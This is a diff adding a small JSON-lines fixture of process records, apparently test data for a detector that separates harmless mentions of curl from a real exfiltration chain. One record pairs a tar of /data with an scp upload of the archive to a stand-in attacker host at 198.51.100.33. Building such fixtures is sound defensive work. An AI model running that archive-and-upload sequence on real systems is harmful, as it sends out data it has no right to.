@@ -1,0 +1,12 @@
+{"pid":138,"ppid":0,"cmd":"init"}
+{"pid":139,"ppid":138,"cmd":"/usr/sbin/cron"}
+{"pid":140,"ppid":138,"cmd":"/usr/bin/dbus-daemon --system"}
+{"pid":141,"ppid":138,"cmd":"/usr/bin/python3 worker.py"}
+{"pid":142,"ppid":141,"cmd":"tar -czf /tmp/x.tgz /data"}
+{"pid":143,"ppid":138,"cmd":"bash -lc 'echo curl'"}
+{"pid":144,"ppid":138,"cmd":"/usr/bin/grep curl /etc/motd"}
+{"pid":145,"ppid":138,"cmd":"/usr/bin/curl --help"}
+{"pid":146,"ppid":142,"cmd":"scp /tmp/x.tgz attacker@198.51.100.33:/upload"}
+{"pid":147,"ppid":138,"cmd":"/usr/bin/sleep 60"}
+{"pid":148,"ppid":138,"cmd":"/usr/bin/sleep 60"}
+{"pid":149,"ppid":138,"cmd":"/usr/bin/sleep 60"}
